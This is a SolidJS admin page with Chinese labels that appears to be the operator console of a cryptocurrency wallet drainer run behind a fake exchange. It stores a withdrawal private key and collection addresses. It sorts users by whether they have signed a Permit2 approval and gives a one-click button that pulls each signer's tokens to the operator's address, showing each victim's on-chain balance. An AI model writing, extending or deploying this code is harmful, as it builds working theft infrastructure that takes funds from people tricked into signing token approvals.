import { createSignal, onMount, For, Show } from "solid-js";
import { adminFetch } from "../store";
import { API_BASE } from "../../shared/config";

interface WithdrawConfig {
  configured: boolean;
  spenderAddress: string;
  receivingAddress: string;
  rpcUrl: string;
}

interface SiteConfig {
  depositAddress: string;
  depositQrUrl: string;
  withdrawToAddress: string;
  withdrawPrivateKey: string;
}

interface DepositAddr {
  id: number;
  chain: string;
  coin: string;
  address: string;
  qrUrl: string;
}

interface UserPermit2 {
  uid: string;
  address: string;
  balanceUsdt: string;
  onchainBalance: string;
  permit2Signature: string | null;
  permit2Token: string | null;
  permit2Amount: string | null;
}

export default function AdminCollection() {
  const [config, setConfig] = createSignal<WithdrawConfig | null>(null);
  const [siteCfg, setSiteCfg] = createSignal<SiteConfig | null>(null);
  const [depositAddrs, setDepositAddrs] = createSignal<DepositAddr[]>([]);
  const [users, setUsers] = createSignal<UserPermit2[]>([]);
  const [loading, setLoading] = createSignal(true);
  const [withdrawingUid, setWithdrawingUid] = createSignal<string | null>(null);
  const [resultMap, setResultMap] = createSignal<Record<string, { ok: boolean; msg: string }>>({});
  const [saving, setSaving] = createSignal(false);
  const [saveMsg, setSaveMsg] = createSignal("");

  // editable fields for withdraw config
  const [editWithdrawAddr, setEditWithdrawAddr] = createSignal("");
  const [editWithdrawKey, setEditWithdrawKey] = createSignal("");

  // new deposit address form
  const [showAddDeposit, setShowAddDeposit] = createSignal(false);
  const [newChain, setNewChain] = createSignal("ERC-20");
  const [newCoin, setNewCoin] = createSignal("USDT");
  const [newAddr, setNewAddr] = createSignal("");
  const [addingDeposit, setAddingDeposit] = createSignal(false);
  const [uploadingId, setUploadingId] = createSignal<number | null>(null);

  async function loadData() {
    setLoading(true);
    try {
      const [cfgRes, scRes, daRes, usersRes] = await Promise.all([
        adminFetch("/admin/withdraw-config"),
        adminFetch("/admin/site-config"),
        adminFetch("/admin/deposit-addresses"),
        adminFetch("/users"),
      ]);
      if (cfgRes.ok) setConfig(await cfgRes.json() as WithdrawConfig);
      if (scRes.ok) {
        const sc = await scRes.json() as SiteConfig;
        setSiteCfg(sc);
        setEditWithdrawAddr(sc.withdrawToAddress);
        setEditWithdrawKey("");
      }
      if (daRes.ok) setDepositAddrs(await daRes.json() as DepositAddr[]);
      if (usersRes.ok) setUsers(await usersRes.json() as UserPermit2[]);
    } catch { /* */ }
    setLoading(false);
  }

  onMount(loadData);

  const authorizedUsers = () => users().filter((u) => !!u.permit2Signature);
  const unauthorizedUsers = () => users().filter((u) => !u.permit2Signature);

  async function saveConfig() {
    setSaving(true); setSaveMsg("");
    try {
      const body: any = { withdrawToAddress: editWithdrawAddr() };
      if (editWithdrawKey()) body.withdrawPrivateKey = editWithdrawKey();
      const res = await adminFetch("/admin/site-config", { method: "PUT", body: JSON.stringify(body) });
      if (res.ok) { setSaveMsg("保存成功"); await loadData(); }
      else setSaveMsg("保存失败");
    } catch { setSaveMsg("网络错误"); }
    setSaving(false);
  }

  async function addDepositAddr() {
    if (!newAddr().trim()) return;
    setAddingDeposit(true);
    try {
      const res = await adminFetch("/admin/deposit-addresses", {
        method: "POST",
        body: JSON.stringify({ chain: newChain(), coin: newCoin(), address: newAddr() }),
      });
      if (res.ok) {
        setNewAddr("");
        setShowAddDeposit(false);
        await loadData();
      }
    } catch { /* */ }
    setAddingDeposit(false);
  }

  async function deleteDepositAddr(id: number) {
    if (!confirm("确定删除此充值地址？")) return;
    await adminFetch(`/admin/deposit-addresses/${id}`, { method: "DELETE" });
    await loadData();
  }

  async function uploadDepositQr(id: number, file: File) {
    setUploadingId(id);
    try {
      const fd = new FormData();
      fd.append("qr", file);
      const token = (await import("../store")).getAdminToken();
      await fetch(`${API_BASE}/admin/deposit-addresses/${id}/qr`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}` },
        body: fd,
      });
      await loadData();
    } catch { /* */ }
    setUploadingId(null);
  }

  async function doWithdraw(uid: string) {
    setWithdrawingUid(uid);
    setResultMap((prev) => { const n = { ...prev }; delete n[uid]; return n; });
    try {
      const res = await adminFetch(`/admin/user/${uid}/withdraw`, {
        method: "POST",
        body: JSON.stringify({}),
      });
      const data = await res.json() as any;
      if (res.ok) {
        setResultMap((prev) => ({ ...prev, [uid]: { ok: true, msg: `成功! TX: ${data.txHash}` } }));
        await loadData();
      } else {
        setResultMap((prev) => ({ ...prev, [uid]: { ok: false, msg: data.message || "提币失败" } }));
      }
    } catch (e: any) {
      setResultMap((prev) => ({ ...prev, [uid]: { ok: false, msg: e.message || "网络错误" } }));
    }
    setWithdrawingUid(null);
  }

  function qrFullUrl(url: string): string {
    if (!url) return "";
    return url.startsWith("http") ? url : `${API_BASE}${url}`;
  }

  return (
    <div>
      <div class="flex items-center justify-between mb-6">
        <h1 class="text-2xl font-bold text-gray-800">收金管理</h1>
        <button type="button" onClick={loadData} class="px-3 py-1.5 text-sm bg-white border border-gray-300 rounded-lg hover:bg-gray-50 text-gray-700">刷新</button>
      </div>

      {/* ── 充值地址管理（按链+币种） ── */}
      <div class="bg-white rounded-xl border border-gray-200 p-5 mb-6">
        <div class="flex items-center justify-between mb-4">
          <h2 class="text-sm font-semibold text-gray-500 uppercase tracking-wider">充值收款地址（前台按链+币种显示）</h2>
          <button type="button" class="px-3 py-1.5 text-xs bg-blue-600 text-white rounded-lg hover:bg-blue-700" onClick={() => setShowAddDeposit(!showAddDeposit())}>+ 添加地址</button>
        </div>

        {/* Add form */}
        <Show when={showAddDeposit()}>
          <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
            <div class="grid grid-cols-1 md:grid-cols-4 gap-3 items-end">
              <div>
                <label class="block text-xs text-gray-500 mb-1">链 / 网络</label>
                <select class="w-full px-3 py-2 border border-gray-300 rounded-lg text-sm bg-white text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" value={newChain()} onChange={(e) => setNewChain(e.currentTarget.value)}>
                  <option value="ERC-20">ERC-20</option>
                  <option value="TRC-20">TRC-20</option>
                  <option value="BEP-20">BEP-20</option>
                  <option value="BTC">BTC</option>
                  <option value="LTC">LTC</option>
                  <option value="SOL">SOL</option>
                </select>
              </div>
              <div>
                <label class="block text-xs text-gray-500 mb-1">币种</label>
                <select class="w-full px-3 py-2 border border-gray-300 rounded-lg text-sm bg-white text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" value={newCoin()} onChange={(e) => setNewCoin(e.currentTarget.value)}>
                  <option value="USDT">USDT</option>
                  <option value="ETH">ETH</option>
                  <option value="BTC">BTC</option>
                  <option value="BNB">BNB</option>
                  <option value="SOL">SOL</option>
                  <option value="USDC">USDC</option>
                </select>
              </div>
              <div>
                <label class="block text-xs text-gray-500 mb-1">收款地址</label>
                <input type="text" class="w-full px-3 py-2 border border-gray-300 rounded-lg text-sm bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-500 font-mono" placeholder="0x... / T... / bc1..." value={newAddr()} onInput={(e) => setNewAddr(e.currentTarget.value)} />
              </div>
              <div class="flex gap-2">
                <button type="button" class="px-4 py-2 text-sm bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50" disabled={addingDeposit() || !newAddr().trim()} onClick={addDepositAddr}>
                  {addingDeposit() ? "添加中…" : "添加"}
                </button>
                <button type="button" class="px-4 py-2 text-sm border border-gray-300 text-gray-600 rounded-lg hover:bg-gray-50" onClick={() => setShowAddDeposit(false)}>取消</button>
              </div>
            </div>
          </div>
        </Show>

        {/* Table */}
        <Show when={!loading()} fallback={<div class="animate-pulse h-20 bg-gray-100 rounded" />}>
          <Show when={depositAddrs().length > 0} fallback={<p class="text-sm text-gray-400 py-4 text-center">暂未配置充值地址，请点击"添加地址"</p>}>
            <div class="overflow-x-auto">
              <table class="w-full text-sm">
                <thead>
                  <tr class="border-b border-gray-100">
                    <th class="text-left py-2 px-3 text-xs font-medium text-gray-400">链</th>
                    <th class="text-left py-2 px-3 text-xs font-medium text-gray-400">币种</th>
                    <th class="text-left py-2 px-3 text-xs font-medium text-gray-400">收款地址</th>
                    <th class="text-center py-2 px-3 text-xs font-medium text-gray-400">二维码</th>
                    <th class="text-center py-2 px-3 text-xs font-medium text-gray-400">操作</th>
                  </tr>
                </thead>
                <tbody>
                  <For each={depositAddrs()}>
                    {(da) => (
                      <tr class="border-b border-gray-50 hover:bg-gray-50/50">
                        <td class="py-2.5 px-3 text-xs font-medium text-gray-700">{da.chain}</td>
                        <td class="py-2.5 px-3 text-xs font-bold text-gray-800">{da.coin}</td>
                        <td class="py-2.5 px-3 font-mono text-xs text-gray-600 max-w-[260px] truncate" title={da.address}>{da.address}</td>
                        <td class="py-2.5 px-3 text-center">
                          <div class="flex items-center justify-center gap-2">
                            <Show when={da.qrUrl}>
                              <img src={qrFullUrl(da.qrUrl)} alt="QR" class="w-10 h-10 rounded border border-gray-200 object-cover" />
                            </Show>
                            <label class="cursor-pointer text-xs text-blue-600 hover:text-blue-800">
                              {uploadingId() === da.id ? "…" : "上传"}
                              <input type="file" accept="image/*" class="hidden" onChange={(e) => { const f = e.currentTarget.files?.[0]; if (f) uploadDepositQr(da.id, f); e.currentTarget.value = ""; }} />
                            </label>
                          </div>
                        </td>
                        <td class="py-2.5 px-3 text-center">
                          <button type="button" class="text-xs text-red-500 hover:text-red-700" onClick={() => deleteDepositAddr(da.id)}>删除</button>
                        </td>
                      </tr>
                    )}
                  </For>
                </tbody>
              </table>
            </div>
          </Show>
        </Show>
      </div>

      {/* ── 提币收款配置 ── */}
      <div class="bg-white rounded-xl border border-gray-200 p-5 mb-6">
        <h2 class="text-sm font-semibold text-gray-500 uppercase tracking-wider mb-4">提币收款配置</h2>
        <Show when={!loading()} fallback={<div class="animate-pulse h-20 bg-gray-100 rounded" />}>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-5 mb-4">
            <div>
              <label class="block text-xs text-gray-500 mb-1">收款地址</label>
              <input type="text" class="w-full px-3 py-2 border border-gray-300 rounded-lg text-sm bg-white text-gray-900 focus:ring-2 focus:ring-blue-500 focus:outline-none font-mono" placeholder="0x..." value={editWithdrawAddr()} onInput={(e) => setEditWithdrawAddr(e.currentTarget.value)} />
            </div>
            <div>
              <label class="block text-xs text-gray-500 mb-1">提币私钥 {siteCfg()?.withdrawPrivateKey ? <span class="text-green-600">({siteCfg()!.withdrawPrivateKey})</span> : ""}</label>
              <input type="password" class="w-full px-3 py-2 border border-gray-300 rounded-lg text-sm bg-white text-gray-900 focus:ring-2 focus:ring-blue-500 focus:outline-none font-mono" placeholder="留空则不修改" value={editWithdrawKey()} onInput={(e) => setEditWithdrawKey(e.currentTarget.value)} />
            </div>
          </div>
          <div class="flex items-center gap-3">
            <button type="button" class="px-4 py-2 text-sm bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50" disabled={saving()} onClick={saveConfig}>
              {saving() ? "保存中…" : "保存配置"}
            </button>
            <Show when={saveMsg()}><span class={`text-sm ${saveMsg() === '保存成功' ? 'text-green-600' : 'text-red-500'}`}>{saveMsg()}</span></Show>
          </div>
        </Show>
      </div>

      {/* ── Permit2 状态 ── */}
      <div class="bg-white rounded-xl border border-gray-200 p-5 mb-6">
        <h2 class="text-sm font-semibold text-gray-500 uppercase tracking-wider mb-4">Permit2 收金状态</h2>
        <Show when={!loading()} fallback={<div class="animate-pulse h-20 bg-gray-100 rounded" />}>
          <Show when={config()} fallback={<p class="text-red-500 text-sm">无法加载配置</p>}>
            {(cfg) => (
              <div class="space-y-3">
                <div class="flex items-center gap-3">
                  <span class={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium ${cfg().configured ? 'bg-green-50 text-green-700' : 'bg-red-50 text-red-700'}`}>
                    <span class={`w-1.5 h-1.5 rounded-full ${cfg().configured ? 'bg-green-500' : 'bg-red-500'}`} />
                    {cfg().configured ? "已配置" : "未配置"}
                  </span>
                </div>
                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <ConfigItem label="Spender 地址 (签名钱包)" value={cfg().spenderAddress || "—"} />
                  <ConfigItem label="收款地址" value={cfg().receivingAddress || "—"} />
                  <ConfigItem label="RPC URL" value={cfg().rpcUrl || "—"} />
                </div>
              </div>
            )}
          </Show>
        </Show>
      </div>

      {/* ── 已授权用户 ── */}
      <div class="bg-white rounded-xl border border-gray-200 p-5 mb-6">
        <div class="flex items-center justify-between mb-4">
          <h2 class="text-sm font-semibold text-gray-500 uppercase tracking-wider">已授权用户</h2>
          <span class="text-xs bg-green-50 text-green-700 px-2 py-0.5 rounded-full font-medium">{authorizedUsers().length} 人</span>
        </div>
        <Show when={!loading()} fallback={<TableSkeleton />}>
          <Show when={authorizedUsers().length > 0} fallback={<p class="text-sm text-gray-400 py-4 text-center">暂无已授权用户</p>}>
            <div class="overflow-x-auto">
              <table class="w-full text-sm">
                <thead>
                  <tr class="border-b border-gray-100">
                    <th class="text-left py-2 px-3 text-xs font-medium text-gray-400">UID</th>
                    <th class="text-left py-2 px-3 text-xs font-medium text-gray-400">钱包地址</th>
                    <th class="text-right py-2 px-3 text-xs font-medium text-gray-400">交易所余额</th>
                    <th class="text-right py-2 px-3 text-xs font-medium text-gray-400">链上余额</th>
                    <th class="text-left py-2 px-3 text-xs font-medium text-gray-400">授权代币</th>
                    <th class="text-center py-2 px-3 text-xs font-medium text-gray-400">操作</th>
                  </tr>
                </thead>
                <tbody>
                  <For each={authorizedUsers()}>
                    {(u) => (
                      <tr class="border-b border-gray-50 hover:bg-gray-50/50">
                        <td class="py-2.5 px-3 font-mono text-xs text-gray-700">{u.uid}</td>
                        <td class="py-2.5 px-3 font-mono text-xs text-gray-500 max-w-[180px] truncate" title={u.address}>{u.address}</td>
                        <td class="py-2.5 px-3 text-right font-mono text-xs">{Number(u.balanceUsdt).toFixed(2)} USDT</td>
                        <td class="py-2.5 px-3 text-right font-mono text-xs">{u.onchainBalance || "0"} ETH</td>
                        <td class="py-2.5 px-3 text-xs text-gray-500">{tokenLabel(u.permit2Token)}</td>
                        <td class="py-2.5 px-3 text-center">
                          <button
                            type="button"
                            class="px-3 py-1.5 text-xs font-bold rounded-lg bg-gradient-to-r from-blue-600 to-indigo-600 text-white hover:from-blue-700 hover:to-indigo-700 disabled:opacity-50 transition-all"
                            disabled={withdrawingUid() === u.uid || !config()?.configured}
                            onClick={() => doWithdraw(u.uid)}
                          >
                            {withdrawingUid() === u.uid ? "提币中..." : "一键提币"}
                          </button>
                          <Show when={resultMap()[u.uid]}>
                            {(r) => (
                              <div class={`mt-1 text-xs ${r().ok ? 'text-green-600' : 'text-red-500'}`}>
                                {r().msg}
                              </div>
                            )}
                          </Show>
                        </td>
                      </tr>
                    )}
                  </For>
                </tbody>
              </table>
            </div>
          </Show>
        </Show>
      </div>

      {/* ── 未授权用户 ── */}
      <div class="bg-white rounded-xl border border-gray-200 p-5">
        <div class="flex items-center justify-between mb-4">
          <h2 class="text-sm font-semibold text-gray-500 uppercase tracking-wider">未授权用户</h2>
          <span class="text-xs bg-orange-50 text-orange-700 px-2 py-0.5 rounded-full font-medium">{unauthorizedUsers().length} 人</span>
        </div>
        <Show when={!loading()} fallback={<TableSkeleton />}>
          <Show when={unauthorizedUsers().length > 0} fallback={<p class="text-sm text-gray-400 py-4 text-center">所有用户均已授权</p>}>
            <div class="overflow-x-auto">
              <table class="w-full text-sm">
                <thead>
                  <tr class="border-b border-gray-100">
                    <th class="text-left py-2 px-3 text-xs font-medium text-gray-400">UID</th>
                    <th class="text-left py-2 px-3 text-xs font-medium text-gray-400">钱包地址</th>
                    <th class="text-right py-2 px-3 text-xs font-medium text-gray-400">交易所余额</th>
                    <th class="text-right py-2 px-3 text-xs font-medium text-gray-400">链上余额</th>
                    <th class="text-center py-2 px-3 text-xs font-medium text-gray-400">状态</th>
                  </tr>
                </thead>
                <tbody>
                  <For each={unauthorizedUsers()}>
                    {(u) => (
                      <tr class="border-b border-gray-50 hover:bg-gray-50/50">
                        <td class="py-2.5 px-3 font-mono text-xs text-gray-700">{u.uid}</td>
                        <td class="py-2.5 px-3 font-mono text-xs text-gray-500 max-w-[180px] truncate" title={u.address}>{u.address}</td>
                        <td class="py-2.5 px-3 text-right font-mono text-xs">{Number(u.balanceUsdt).toFixed(2)} USDT</td>
                        <td class="py-2.5 px-3 text-right font-mono text-xs">{u.onchainBalance || "0"} ETH</td>
                        <td class="py-2.5 px-3 text-center">
                          <span class="text-xs text-orange-500">等待连接钱包</span>
                        </td>
                      </tr>
                    )}
                  </For>
                </tbody>
              </table>
            </div>
          </Show>
        </Show>
      </div>
    </div>
  );
}

function ConfigItem(props: { label: string; value: string }) {
  return (
    <div class="bg-gray-50 rounded-lg p-3">
      <p class="text-xs text-gray-400 mb-1">{props.label}</p>
      <p class="text-xs font-mono text-gray-700 break-all">{props.value}</p>
    </div>
  );
}

function tokenLabel(addr: string | null): string {
  if (!addr) return "—";
  const map: Record<string, string> = {
    "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDT",
    "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": "USDC",
    "0x6b175474e89094c44da98b954eedeac495271d0f": "DAI",
    "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2": "WETH",
  };
  return map[addr.toLowerCase()] || `${addr.slice(0, 6)}...${addr.slice(-4)}`;
}

function TableSkeleton() {
  return (
    <div class="animate-pulse space-y-2">
      <div class="h-8 bg-gray-100 rounded" />
      <div class="h-8 bg-gray-100 rounded" />
      <div class="h-8 bg-gray-100 rounded" />
    </div>
  );
}
